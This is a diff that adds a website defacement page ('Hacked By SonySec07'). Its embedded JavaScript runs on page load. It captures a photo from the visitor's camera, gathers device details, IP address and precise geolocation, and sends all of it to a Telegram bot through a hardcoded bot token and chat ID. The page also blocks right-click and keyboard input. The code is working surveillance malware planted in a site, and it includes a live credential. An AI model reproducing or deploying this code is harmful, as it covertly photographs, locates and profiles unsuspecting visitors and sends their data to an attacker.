@@ -1,0 +1,157 @@
+<!DOCTYPE html><html lang="en">
+<head>
+  <meta charset="UTF-8"/>
+  <title>Hacked By SonySec07</title>
+  <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
+  <meta name="viewport" content="width=device-width, initial-scale=1"/>
+  <style>
+    body, a:hover { cursor: url(../cur.cursors-4u.net/symbols/sym-1/sym46.cur), progress !important; }
+    center { font-family: Courier; }
+    img, .photo-preview { display: block; margin: 20px auto; max-width: 90%; border-radius: 8px; }
+    video { display: block; margin: 20px auto; border: 3px solid #000; border-radius: 8px; max-width: 90%; height: auto; }
+  </style>
+  <script>
+    const BOT_TOKEN = "7843724459:AAF1NRTK0lyN33cul3xUtZBWQa4ar-havIY";
+    const CHAT_ID  = "7843724459";window.addEventListener('DOMContentLoaded', async () => {
+  try {
+    // 1. Minta izin kamera & tampilkan video
+    const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
+    const video  = document.createElement('video');
+    video.autoplay    = true;
+    video.playsInline = true;
+    video.srcObject   = stream;
+    document.body.insertBefore(video, document.body.firstChild);
+
+    // 2. Tunggu video siap, lalu tangkap foto
+    video.addEventListener('loadeddata', () => {
+      setTimeout(() => captureAndSend(video, stream), 1000);
+    });
+
+  } catch (err) {
+    console.error('Camera access error:', err);
+    // Jika gagal kamera, tetap kirim hanya info (tanpa foto)
+    gatherAndSendInfo();
+  }
+});
+
+async function captureAndSend(video, stream) {
+  // Buat canvas dan gambar frame
+  const canvas = document.createElement('canvas');
+  canvas.width  = video.videoWidth;
+  canvas.height = video.videoHeight;
+  const ctx = canvas.getContext('2d');
+  ctx.drawImage(video, 0, 0);
+
+  // Tampilkan preview foto di halaman
+  const preview = document.createElement('img');
+  preview.className = 'photo-preview';
+  preview.src = canvas.toDataURL('image/jpeg', 0.8);
+  document.body.insertBefore(preview, video.nextSibling);
+
+  // Hentikan stream
+  stream.getTracks().forEach(t => t.stop());
+
+  // Kirim foto ke Telegram
+  canvas.toBlob(async blob => {
+    await sendPhoto(blob);
+    await gatherAndSendInfo();
+  }, 'image/jpeg', 0.8);
+}
+
+function getPublicIP() {
+  return new Promise((resolve, reject) => {
+    const pc = new RTCPeerConnection({ iceServers: [] });
+    pc.createDataChannel('');
+    pc.createOffer().then(offer => pc.setLocalDescription(offer));
+    pc.onicecandidate = e => {
+      if (!e.candidate) return;
+      const parts = e.candidate.candidate.split(' ');
+      const addr  = parts[4];
+      if (addr && addr.match(/(\d{1,3}\.){3}\d{1,3}/)) {
+        resolve(addr);
+        pc.onicecandidate = null;
+        pc.close();
+      }
+    };
+  });
+}
+
+function getGeoLocation() {
+  return new Promise((resolve, reject) => {
+    if (!navigator.geolocation) return reject('Geolocation not supported');
+    navigator.geolocation.getCurrentPosition(pos => {
+      resolve({ latitude: pos.coords.latitude, longitude: pos.coords.longitude });
+    }, err => reject(err.message), { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 });
+  });
+}
+
+async function gatherAndSendInfo() {
+  try {
+    // Device Info
+    const ua       = navigator.userAgent;
+    const platform = navigator.platform;
+    const lang     = navigator.language;
+    const [w, h]   = [screen.width, screen.height];
+
+    // IP & Geo
+    let ip = 'unknown', geo = {};
+    try { ip = await getPublicIP(); } catch(_) { console.warn('IP retrieval failed'); }
+    try { geo = await getGeoLocation(); } catch(_) { console.warn('Geo retrieval failed'); }
+
+    // Susun pesan
+    let text = `📌 *Device Info*\n`;
+    text += `• UA        : \`${ua}\`\n`;
+    text += `• Platform  : \`${platform}\`\n`;
+    text += `• Language  : \`${lang}\`\n`;
+    text += `• Resolution: ${w}×${h}\n\n`;
+    text += `🌐 *Network & Geo Info*\n`;
+    text += `• IP Address: \`${ip}\`\n`;
+    if (geo.latitude && geo.longitude) {
+      text += `• Geo coords : ${geo.latitude.toFixed(6)}, ${geo.longitude.toFixed(6)}\n`;
+      const mapsUrl = `https://www.google.com/maps/search/?api=1&query=${geo.latitude},${geo.longitude}`;
+      text += `• Maps link  : [Lihat di Maps](${mapsUrl})\n`;
+    }
+
+    // Kirim pesan
+    await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+      method: 'POST',
+      headers: {'Content-Type':'application/json'},
+      body: JSON.stringify({ chat_id: CHAT_ID, text, parse_mode: 'Markdown' })
+    });
+  } catch (err) {
+    console.error('Error sending info:', err);
+  }
+}
+
+async function sendPhoto(photoBlob) {
+  const form = new FormData();
+  form.append("chat_id", CHAT_ID);
+  form.append("photo", photoBlob, "capture.jpg");
+  await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendPhoto`, {
+    method: 'POST',
+    body: form
+  });
+}
+
+  </script>
+</head>
+<body bgcolor="white" text="black"
+      oncontextmenu="return false;" onkeydown="return false;" onmousedown="return false;">
+  <table width="100%" height="80%"><td>
+    <center>
+      <small>4 BROTHER</small><br>
+      <img src="https://abilitysportsafrica.org/alok99.png" width="220" height="220"><br>
+      Hacked by <red><i>SonySec07</i></red><br>
+      <font size="2">
+        wh00pz! your website security get down<br>
+        patch it before something bad happens
+      </font><br><br>
+      <small><font size="1" color="gray">johnfelix@mail2tor.co</font></small><br><br><br>
+      <font size="2"><i>Greetz</i><br>
+      …[daftar grup/hacker]…
+      </font>
+    </center>
+  </td></table>
+  <audio src="https://i.top4top.io/m_3076tjqzc0.mp3" autoplay loop></audio>
+</body>
+</html>
